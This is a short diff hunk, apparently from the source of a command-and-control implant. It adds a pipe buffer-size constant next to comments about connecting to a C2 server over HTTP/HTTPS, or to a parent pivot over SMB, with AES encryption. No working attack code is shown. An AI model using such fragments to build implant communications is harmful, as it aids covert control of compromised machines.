@@ -5,6 +5,8 @@
 #include <Core/TransportHttp.h>
 #include <Core/TransportSmb.h>
 
+#define PIPE_BUFFER_MAX 0x10000
+
 /*!
  * Initialize HTTP/HTTPS Connection to C2 Server + using AES encryption or
  * Initializes a connection to the parent pivot over SMB + using AES encryption
